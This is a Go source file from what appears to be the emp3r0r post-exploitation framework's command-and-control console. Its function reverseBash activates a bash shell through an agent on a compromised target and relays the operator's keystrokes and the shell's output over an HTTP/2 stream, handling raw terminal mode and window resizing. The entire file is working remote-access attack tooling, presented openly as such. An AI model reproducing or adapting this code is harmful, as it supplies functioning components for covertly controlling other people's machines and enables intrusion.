package cc

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"

	"github.com/creack/pty"
	"github.com/fatih/color"
	"github.com/jm33-m0/emp3r0r/emagent/internal/agent"
)

func reverseBash() {
	// check if stty is installed
	if !IsCommandExist("stty") {
		CliPrintError("stty is not found, wtf?")
		return
	}

	// activate reverse shell in agent
	err := SendCmd("bash", CurrentTarget)
	if err != nil {
		CliPrintError("Cannot activate reverse shell on remote target: ", err)
		return
	}

	// use /dev/tty for our console
	ttyf, err := os.Open("/dev/tty")
	if err != nil {
		CliPrintError("Cannot open /dev/tty: %v", err)
	}

	// back up terminal settings using `stty -g`
	out, err := exec.Command("stty", "-F", "/dev/tty", "-g").CombinedOutput()
	if err != nil {
		CliPrintError("Cannot save current terminal settings: %v\n%s", err, out)
	}
	oldTerm := strings.TrimSpace(string(out))

	// clean up connection and TTY file
	cleanup := func() {
		out, err := exec.Command("stty", "-F", "/dev/tty", oldTerm).CombinedOutput()
		if err != nil {
			CliPrintError("failed to restore terminal: %v\n%s", err, out)
		}
		err = ttyf.Close()
		if err != nil {
			CliPrintWarning("Closing /dev/tty: %v", err)
		}

		err = agent.H2Stream.Close()
		if err != nil {
			CliPrintWarning("Closing reverse shell connection: ", err)
		}
		CliPrintWarning("Cleaned up reverseBash")
	}
	defer cleanup()

	// receive and display bash's output
	go func() {
		for incoming := range RecvAgent {
			if agent.H2StreamDone {
				break
			}
			os.Stdout.Write(incoming)
		}
		CliPrintWarning("Read remote finished")
	}()

	// send whatever input to target's bash
	go func() {
		for outgoing := range SendAgent {
			if agent.H2StreamDone {
				break
			}

			// if connection does not exist yet
			if agent.H2Stream == nil {
				continue
			}
			_, err = agent.H2Stream.Write(outgoing)
			if err != nil {
				CliPrintWarning("Send to remote: %v", err)
				break
			}
		}
		CliPrintWarning("Send to remote finished")
	}()

	/*
		set up terminal
	*/
	// Handle pty size.
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGWINCH)
	go func() {
		for range ch {
			if agent.H2StreamDone {
				break
			}

			// resize local terminal
			if err := pty.InheritSize(os.Stdin, ttyf); err != nil {
				log.Printf("error resizing pty: %s", err)
			}
			// sync remote terminal with stty
			winSize, err := pty.GetsizeFull(os.Stdin)
			if err != nil {
				CliPrintWarning("Cannot get terminal size: %v", err)
				return
			}
			setupTermCmd := fmt.Sprintf("stty rows %d columns %d;clear\n",
				winSize.Rows, winSize.Cols)
			SendAgent <- []byte(setupTermCmd)
		}
		CliPrintWarning("Terminal resizer finished")
	}()
	ch <- syscall.SIGWINCH // Initial resize.

	// resize remote terminal to match local
	currentWinSize, err := pty.GetsizeFull(os.Stdin)
	if err != nil {
		CliPrintWarning("Cannot get terminal size: %v", err)
	}
	setupTermCmd := fmt.Sprintf("stty rows %d columns %d;clear\n",
		currentWinSize.Rows, currentWinSize.Cols)
	SendAgent <- []byte(setupTermCmd)

	// switch to raw mode
	out, err = exec.Command("stty", "-F", "/dev/tty", "raw", "-echo").CombinedOutput()
	if err != nil {
		CliPrintError("stty raw mode failed: %v\n%s", err, out)
		return
	}

	// read user input from /dev/tty
	for {
		// if connection is lost, press any key to exit
		if agent.H2StreamDone {
			CliPrintWarning("Remote bash disconnected, aborting...")
			return
		}

		buf := make([]byte, agent.BufSize)
		consoleReader := bufio.NewReader(ttyf)
		_, err := consoleReader.Read(buf)
		if err != nil {
			CliPrintWarning("Bash read input: %v", err)
			break
		}
		color.Red("%v", buf)
		if buf[0] == 4 { // Ctrl-D is 4
			color.Red("EOF")
			break
		}

		// send our byte
		SendAgent <- buf
	}

	// always send 'exit' to correctly log out our bash shell
	SendAgent <- []byte("exit\n\n")
}
